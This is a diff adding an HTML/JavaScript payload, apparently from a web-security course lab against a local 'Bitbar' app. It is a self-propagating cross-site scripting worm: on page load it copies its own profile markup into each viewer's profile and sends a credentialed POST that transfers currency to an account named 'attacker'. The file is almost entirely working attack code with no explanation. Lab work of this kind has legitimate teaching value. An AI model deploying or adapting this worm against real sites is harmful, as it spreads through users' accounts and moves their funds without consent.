@@ -1,0 +1,36 @@
+<span id="bitbar_count" class="10"></span>
+<script>
+function transfer() {
+    fetch('http://localhost:3000/post_transfer', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'destination_username=attacker&quantity=1',
+            credentials: 'include'
+        });
+}
+
+function Worm() {
+    var worm = document.getElementById("profile");
+    const ProfileContent = encodeURIComponent(worm.innerHTML);
+    fetch('http://localhost:3000/set_profile', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: `new_profile=${ProfileContent}`,
+        credentials: 'include'
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('success');
+        }
+    });
+}
+
+Worm();
+transfer();
+
+</script>
+
+
+
